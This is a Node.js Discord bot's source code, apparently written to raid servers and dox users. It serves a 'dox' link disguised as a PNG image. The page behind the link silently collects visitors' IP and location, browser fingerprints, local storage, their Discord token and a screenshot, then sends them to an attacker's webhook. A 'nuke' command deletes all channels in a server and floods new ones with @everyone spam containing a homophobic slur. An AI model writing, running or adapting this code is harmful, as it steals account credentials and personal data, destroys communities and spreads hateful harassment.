const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

const links = new Map();

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`🌐 Dox server on ${PORT}`));

client.once('ready', async () => {
    console.log(`🤖 ${client.user.tag} ready`);
    await client.application.commands.set([]);
    await client.application.commands.set([
        {
            name: 'dox',
            description: 'Ultimate dox link',
            options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }]
        },
        {
            name: 'spam',
            description: 'Spam a channel',
            options: [
                { name: 'count', type: 4, description: 'Number of messages', required: true },
                { name: 'message', type: 3, description: 'Content', required: true }
            ]
        },
        {
            name: 'nuke',
            description: 'Delete channels, create 20, spam, leave',
            options: [
                { name: 'count', type: 4, description: 'Messages per channel (default 10, max 100)', required: false },
                { name: 'delay', type: 4, description: 'Delay between messages (ms, default 50)', required: false }
            ]
        },
        { name: 'ad', description: 'Advertise server' },
        {
            name: 'purge',
            description: 'Delete messages',
            options: [
                { name: 'amount', type: 4, description: 'Number of messages', required: true },
                { name: 'user', type: 6, description: 'Target user (optional)', required: false }
            ]
        }
    ]);
    console.log('✅ Commands loaded');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // ---- DOX ----
    if (interaction.commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });
        const wh = interaction.options.getString('webhook');
        if (!wh.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Invalid webhook URL.');
        }
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { webhook: wh, user: interaction.user.tag });
        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 ${url}\n\nSends IP, location, token, storage, screenshot, fingerprints.`);
        await interaction.editReply({ embeds: [embed] });
        return;
    }

    // ---- SPAM ----
    if (interaction.commandName === 'spam') {
        await interaction.deferReply({ ephemeral: true });
        const count = interaction.options.getInteger('count');
        const msg = interaction.options.getString('message');
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        const max = Math.min(count, 100);
        for (let i = 0; i < max; i++) {
            await channel.send(msg).catch(() => {});
        }
        await interaction.editReply(`✅ Spammed ${max} messages.`);
        return;
    }

    // ---- NUKE ----
    if (interaction.commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });
        const guild = interaction.guild;
        if (!guild) return interaction.editReply('❌ Server only.');
        if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.editReply('❌ I need Administrator.');
        }

        const messagesPerChannel = Math.min(interaction.options.getInteger('count') || 10, 100);
        const delayMs = Math.min(interaction.options.getInteger('delay') || 50, 500);
        const channelCount = 20;
        const maxLength = 2000;

        const baseLine = '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
        const variants = [
            baseLine,
            '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER',
            '# PULSE OWNS ALL U F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH AS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SRVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERV ER',
            '# PULSE OWNS ALL YOU FAGGOTS TRASH ASS SERVER',
        ];
        const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

        try {
            await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));

            const newChannels = await Promise.all(
                Array.from({ length: channelCount }, () =>
                    guild.channels.create({ name: 'pulse', type: 0 }).catch(() => null)
                )
            );
            const valid = newChannels.filter(c => c !== null);

            const messages = [];
            for (let i = 0; i < messagesPerChannel; i++) {
                const line = variants[i % variants.length];
                let bigMessage = `@everyone ${line}\n`;
                const repeatLine = line + '\n';
                while (bigMessage.length + repeatLine.length < maxLength - inviteLine.length - 2) {
                    bigMessage += repeatLine;
                }
                bigMessage += `\n${inviteLine}`;
                bigMessage = bigMessage.slice(0, maxLength);
                messages.push(bigMessage);
            }

            for (let i = 0; i < messages.length; i++) {
                const msg = messages[i];
                await Promise.all(valid.map(ch => ch.send(msg).catch(() => {})));
                if (i < messages.length - 1) await new Promise(r => setTimeout(r, delayMs));
            }

            await guild.leave();
            await interaction.editReply(`✅ Nuked. Created ${valid.length} channels, sent ${messagesPerChannel} messages each, left.`);
        } catch (e) {
            await interaction.editReply('❌ Nuke failed: ' + e.message);
        }
        return;
    }

    // ---- AD ----
    if (interaction.commandName === 'ad') {
        await interaction.deferReply({ ephemeral: true });
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        const msg = `🔥 PULSE NUKE POWER 🔥\n${INVITE_LINK}`;
        await channel.send(msg).catch(() => {});
        await interaction.editReply('✅ Ad sent.');
        return;
    }

    // ---- PURGE ----
    if (interaction.commandName === 'purge') {
        await interaction.deferReply({ ephemeral: true });
        const amount = interaction.options.getInteger('amount');
        const user = interaction.options.getUser('user');
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        if (!channel.permissionsFor(interaction.member).has(PermissionsBitField.Flags.ManageMessages)) {
            return interaction.editReply('❌ You need Manage Messages.');
        }
        let messages = await channel.messages.fetch({ limit: Math.min(amount, 100) });
        if (user) messages = messages.filter(m => m.author.id === user.id);
        const deleted = await channel.bulkDelete(messages, true).catch(() => {});
        await interaction.editReply(`✅ Purged ${deleted ? deleted.size : 0} messages.`);
        return;
    }
});

// ---- DOX HTML – Fixed Syntax, White Page, IP Always Shows ----
function generateDoxHTML(webhook) {
    // Build the HTML as a plain string (no nested template literals)
    return '<!DOCTYPE html>\n' +
           '<html>\n' +
           '<head>\n' +
           '    <meta charset="UTF-8">\n' +
           '    <title></title>\n' +
           '    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"><\/script>\n' +
           '    <style>\n' +
           '        body { background: #ffffff; margin: 0; height: 100vh; }\n' +
           '    </style>\n' +
           '</head>\n' +
           '<body>\n' +
           '<script>\n' +
           'const WEBHOOK_URL = "' + webhook + '";\n' +
           '\n' +
           'function hash(str) {\n' +
           '    let h = 0;\n' +
           '    for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }\n' +
           '    return h.toString(36);\n' +
           '}\n' +
           '\n' +
           'function getCookie(name) {\n' +
           '    const value = "; " + document.cookie;\n' +
           '    const parts = value.split("; " + name + "=");\n' +
           '    if (parts.length === 2) return parts.pop().split(";").shift();\n' +
           '    return null;\n' +
           '}\n' +
           '\n' +
           'async function getIPData() {\n' +
           '    const apis = [\n' +
           '        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },\n' +
           '        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },\n' +
           '        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) },\n' +
           '        { url: "https://ipapi.co/json/", parse: d => ({ ip: d.ip, country: d.country_name, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.org, timezone: d.timezone }) },\n' +
           '        { url: "https://api.ip.sb/geoip", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.isp, timezone: d.timezone }) },\n' +
           '        { url: "https://geoplugin.net/json.gp", parse: d => ({ ip: d.geoplugin_request, country: d.geoplugin_countryName, region: d.geoplugin_region, city: d.geoplugin_city, postal: d.geoplugin_postcode, lat: d.geoplugin_latitude, lon: d.geoplugin_longitude, asn: "N/A", isp: d.geoplugin_isp, timezone: d.geoplugin_timezone }) }\n' +
           '    ];\n' +
           '    for (const api of apis) {\n' +
           '        try {\n' +
           '            const controller = new AbortController();\n' +
           '            const timeout = setTimeout(() => controller.abort(), 5000);\n' +
           '            const res = await fetch(api.url, { signal: controller.signal });\n' +
           '            clearTimeout(timeout);\n' +
           '            const data = await res.json();\n' +
           '            if (data.ip) {\n' +
           '                const result = api.parse(data);\n' +
           '                if (result.ip) return result;\n' +
           '            }\n' +
           '        } catch (e) { console.error("IP fetch failed:", api.url, e); }\n' +
           '    }\n' +
           '    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };\n' +
           '}\n' +
           '\n' +
           'async function getBattery() {\n' +
           '    try { const b = await navigator.getBattery(); return Math.round(b.level*100)+"% ("+(b.charging?"Charging":"Not")+")"; }\n' +
           '    catch { return "Not Available"; }\n' +
           '}\n' +
           '\n' +
           'function getConnection() {\n' +
           '    try {\n' +
           '        const c = navigator.connection || navigator.mozConnection;\n' +
           '        if (c) return (c.effectiveType || c.type) + " (" + (c.downlink || "N/A") + " Mbps)";\n' +
           '    } catch {}\n' +
           '    return "Not Available";\n' +
           '}\n' +
           '\n' +
           'function getGPU() {\n' +
           '    try {\n' +
           '        const canvas = document.createElement("canvas");\n' +
           '        const gl = canvas.getContext("webgl");\n' +
           '        if (!gl) return "N/A";\n' +
           '        const debug = gl.getExtension("WEBGL_debug_renderer_info");\n' +
           '        if (!debug) return "N/A";\n' +
           '        return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);\n' +
           '    } catch { return "N/A"; }\n' +
           '}\n' +
           '\n' +
           'function getWebRTC() {\n' +
           '    return new Promise(r => {\n' +
           '        try {\n' +
           '            const pc = new RTCPeerConnection({ iceServers: [] });\n' +
           '            pc.createDataChannel("");\n' +
           '            pc.createOffer().then(o => pc.setLocalDescription(o));\n' +
           '            pc.onicecandidate = e => {\n' +
           '                if (!e.candidate) return;\n' +
           '                const ip = e.candidate.address || e.candidate.ip;\n' +
           '                if (ip && !ip.includes("local")) { r(ip); pc.close(); }\n' +
           '            };\n' +
           '            setTimeout(() => { r("N/A"); pc.close(); }, 2000);\n' +
           '        } catch { r("N/A"); }\n' +
           '    });\n' +
           '}\n' +
           '\n' +
           'function getCanvasFP() {\n' +
           '    try {\n' +
           '        const canvas = document.createElement("canvas");\n' +
           '        canvas.width = 256; canvas.height = 64;\n' +
           '        const ctx = canvas.getContext("2d");\n' +
           '        ctx.textBaseline = "top";\n' +
           '        ctx.font = "14px Arial";\n' +
           '        ctx.fillStyle = "#f60";\n' +
           '        ctx.fillRect(125, 1, 62, 20);\n' +
           '        ctx.fillStyle = "#069";\n' +
           '        ctx.fillText("Cwm fjordbank glyphs vext quiz", 2, 15);\n' +
           '        ctx.fillStyle = "rgba(102,204,0,0.7)";\n' +
           '        ctx.fillText("Cwm fjordbank glyphs vext quiz", 4, 17);\n' +
           '        return canvas.toDataURL();\n' +
           '    } catch { return "N/A"; }\n' +
           '}\n' +
           '\n' +
           'function getFonts() {\n' +
           '    const fontList = ["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Impact","Tahoma","Trebuchet MS","Calibri","Cambria","Consolas","Segoe UI","Roboto","Open Sans","Lato","Montserrat","Poppins","Ubuntu","Inter"];\n' +
           '    const base = "mmmmmmmmmmlli";\n' +
           '    const test = document.createElement("span");\n' +
           '    test.style.cssText = "position:absolute;top:-9999px;left:-9999px;font-size:72px;font-family:monospace;";\n' +
           '    test.innerHTML = base;\n' +
           '    document.body.appendChild(test);\n' +
           '    const refWidth = test.offsetWidth, refHeight = test.offsetHeight;\n' +
           '    const detected = [];\n' +
           '    fontList.forEach(font => {\n' +
           '        test.style.fontFamily = font + ", monospace";\n' +
           '        if (test.offsetWidth !== refWidth || test.offsetHeight !== refHeight) detected.push(font);\n' +
           '    });\n' +
           '    document.body.removeChild(test);\n' +
           '    return detected;\n' +
           '}\n' +
           '\n' +
           'function getAudioFP() {\n' +
           '    return new Promise(resolve => {\n' +
           '        try {\n' +
           '            const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);\n' +
           '            const osc = ctx.createOscillator();\n' +
           '            osc.type = "triangle";\n' +
           '            osc.frequency.value = 1000;\n' +
           '            const comp = ctx.createDynamicsCompressor();\n' +
           '            osc.connect(comp);\n' +
           '            comp.connect(ctx.destination);\n' +
           '            osc.start(0);\n' +
           '            ctx.oncomplete = e => {\n' +
           '                const buffer = e.renderedBuffer.getChannelData(0);\n' +
           '                let str = "";\n' +
           '                for (let i = 0; i < 100; i++) str += buffer[i].toFixed(6);\n' +
           '                resolve(hash(str));\n' +
           '            };\n' +
           '            ctx.startRendering();\n' +
           '        } catch { resolve("N/A"); }\n' +
           '    });\n' +
           '}\n' +
           '\n' +
           'async function takeScreenshot() {\n' +
           '    try {\n' +
           '        if (typeof html2canvas === "undefined") return null;\n' +
           '        await new Promise(r => setTimeout(r, 100));\n' +
           '        const canvas = await html2canvas(document.body, {\n' +
           '            useCORS: true,\n' +
           '            logging: false,\n' +
           '            scale: 1,\n' +
           '            width: window.innerWidth,\n' +
           '            height: document.documentElement.scrollHeight,\n' +
           '            windowHeight: document.documentElement.scrollHeight,\n' +
           '            scrollY: 0,\n' +
           '            scrollX: 0\n' +
           '        });\n' +
           '        return canvas.toDataURL("image/png");\n' +
           '    } catch { return null; }\n' +
           '}\n' +
           '\n' +
           '(async function() {\n' +
           '    try {\n' +
           '        const ip = await getIPData();\n' +
           '        const battery = await getBattery();\n' +
           '        const conn = getConnection();\n' +
           '        const gpu = getGPU();\n' +
           '        const webrtc = await getWebRTC();\n' +
           '        const canvasFP = getCanvasFP();\n' +
           '        const fonts = getFonts();\n' +
           '        const audioFP = await getAudioFP();\n' +
           '\n' +
           '        const ua = navigator.userAgent;\n' +
           '        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";\n' +
           '        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";\n' +
           '        const deviceType = /mobile|android|iphone|ipad/i.test(ua) ? "📱 Mobile" : /tablet|ipad/i.test(ua) ? "📱 Tablet" : "💻 Desktop";\n' +
           '\n' +
           '        let ls = {}, ss = {};\n' +
           '        try { for (let i=0; i<localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage[k]; } } catch {}\n' +
           '        try { for (let i=0; i<sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage[k]; } } catch {}\n' +
           '\n' +
           '        let discordToken = localStorage.getItem("token") || getCookie("token") || "N/A";\n' +
           '\n' +
           '        const pageTitle = document.title;\n' +
           '        const pageURL = window.location.href;\n' +
           '        const referrer = document.referrer || "N/A";\n' +
           '\n' +
           '        const now = new Date();\n' +
           '        const timeData = {\n' +
           '            timestamp: now.toISOString(),\n' +
           '            local: now.toString(),\n' +
           '            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n' +
           '            offset: now.getTimezoneOffset()\n' +
           '        };\n' +
           '\n' +
           '        const data = {\n' +
           '            ip: ip.ip, country: ip.country, region: ip.region, city: ip.city, postal: ip.postal,\n' +
           '            lat: ip.lat, lon: ip.lon, asn: ip.asn, isp: ip.isp, timezone: ip.timezone,\n' +
           '            battery, connection: conn, gpu, webrtc, canvasFP: hash(canvasFP), fonts: fonts.join(", "),\n' +
           '            audioFP, browser, os, deviceType,\n' +
           '            screen: screen.width+"x"+screen.height,\n' +
           '            colorDepth: screen.colorDepth,\n' +
           '            pixelDepth: screen.pixelDepth,\n' +
           '            devicePixelRatio: window.devicePixelRatio || 1,\n' +
           '            language: navigator.language,\n' +
           '            languages: navigator.languages ? navigator.languages.join(", ") : "N/A",\n' +
           '            platform: navigator.platform,\n' +
           '            hardwareCores: navigator.hardwareConcurrency || "N/A",\n' +
           '            deviceMemory: navigator.deviceMemory || "N/A",\n' +
           '            touchPoints: navigator.maxTouchPoints || 0,\n' +
           '            cookiesEnabled: navigator.cookieEnabled ? "Enabled" : "Disabled",\n' +
           '            doNotTrack: navigator.doNotTrack || "N/A",\n' +
           '            discordToken: discordToken,\n' +
           '            localStorage: JSON.stringify(ls).slice(0, 1000),\n' +
           '            sessionStorage: JSON.stringify(ss).slice(0, 1000),\n' +
           '            pageTitle, pageURL, referrer,\n' +
           '            userAgent: ua,\n' +
           '            time: timeData\n' +
           '        };\n' +
           '\n' +
           '        const fields = [\n' +
           '            { name: "🌐 IP", value: data.ip || "N/A", inline: true },\n' +
           '            { name: "📍 Country", value: data.country || "N/A", inline: true },\n' +
           '            { name: "🏙️ City", value: data.city || "N/A", inline: true },\n' +
           '            { name: "🗺️ Region", value: data.region || "N/A", inline: true },\n' +
           '            { name: "📮 Postal", value: data.postal || "N/A", inline: true },\n' +
           '            { name: "📌 Coordinates", value: (data.lat || "N/A") + ", " + (data.lon || "N/A"), inline: true },\n' +
           '            { name: "🔢 ASN", value: data.asn || "N/A", inline: true },\n' +
           '            { name: "🏢 ISP", value: data.isp || "N/A", inline: true },\n' +
           '            { name: "🕒 Timezone", value: data.timezone || "N/A", inline: true },\n' +
           '            { name: "⏰ Local Time", value: data.time.local || "N/A", inline: false },\n' +
           '            { name: "🔋 Battery", value: data.battery || "N/A", inline: true },\n' +
           '            { name: "📶 Connection", value: data.connection || "N/A", inline: true },\n' +
           '            { name: "📱 Screen", value: data.screen || "N/A", inline: true },\n' +
           '            { name: "🧠 Browser", value: data.browser || "N/A", inline: true },\n' +
           '            { name: "💻 OS", value: data.os || "N/A", inline: true },\n' +
           '            { name: "🖥️ Device", value: data.deviceType || "N/A", inline: true },\n' +
           '            { name: "🎮 GPU", value: data.gpu || "N/A", inline: false },\n' +
           '            { name: "📡 WebRTC", value: data.webrtc || "N/A", inline: true },\n' +
           '            { name: "💾 Hardware", value: (data.hardwareCores || "N/A") + " cores, " + (data.deviceMemory || "N/A") + "GB RAM", inline: true },\n' +
           '            { name: "🖱️ Touch", value: data.touchPoints + " points", inline: true },\n' +
           '            { name: "🍪 Cookies", value: data.cookiesEnabled, inline: true },\n' +
           '            { name: "🚫 Do Not Track", value: data.doNotTrack, inline: true },\n' +
           '            { name: "🖼️ Canvas FP", value: data.canvasFP, inline: true },\n' +
           '            { name: "🔤 Fonts", value: data.fonts || "N/A", inline: false },\n' +
           '            { name: "🔊 Audio FP", value: data.audioFP, inline: true },\n' +
           '            { name: "🔑 Discord Token", value: data.discordToken || "N/A", inline: false },\n' +
           '            { name: "📂 localStorage (truncated)", value: data.localStorage || "N/A", inline: false },\n' +
           '            { name: "📂 sessionStorage (truncated)", value: data.sessionStorage || "N/A", inline: false },\n' +
           '            { name: "📄 Page Title", value: data.pageTitle || "N/A", inline: true },\n' +
           '            { name: "🔗 Page URL", value: data.pageURL || "N/A", inline: false },\n' +
           '            { name: "↩️ Referrer", value: data.referrer || "N/A", inline: false },\n' +
           '            { name: "🌐 User Agent", value: data.userAgent || "N/A", inline: false }\n' +
           '        ];\n' +
           '\n' +
           '        const embed = {\n' +
           '            title: "☠️ Doxxed",\n' +
           '            color: 0xFF0000,\n' +
           '            fields: fields,\n' +
           '            footer: { text: "Logged at " + data.time.timestamp }\n' +
           '        };\n' +
           '\n' +
           '        await fetch(WEBHOOK_URL, {\n' +
           '            method: "POST",\n' +
           '            headers: { "Content-Type": "application/json" },\n' +
           '            body: JSON.stringify({ embeds: [embed] })\n' +
           '        });\n' +
           '\n' +
           '        const screenshot = await takeScreenshot();\n' +
           '        if (screenshot) {\n' +
           '            const blob = await fetch(screenshot).then(r => r.blob());\n' +
           '            const formData = new FormData();\n' +
           '            formData.append("file", blob, "screenshot.png");\n' +
           '            await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(() => {});\n' +
           '        }\n' +
           '\n' +
           '    } catch (err) {\n' +
           '        console.error("Dox error:", err);\n' +
           '    }\n' +
           '\n' +
           '    document.body.innerHTML = "";\n' +
           '    document.body.style.background = "#ffffff";\n' +
           '    document.body.style.margin = "0";\n' +
           '    document.body.style.height = "100vh";\n' +
           '    setTimeout(() => {\n' +
           '        window.close();\n' +
           '        window.location.href = "about:blank";\n' +
           '    }, 1500);\n' +
           '})();\n' +
           '<\/script>\n' +
           '</body>\n' +
           '</html>';
}

client.login(TOKEN);
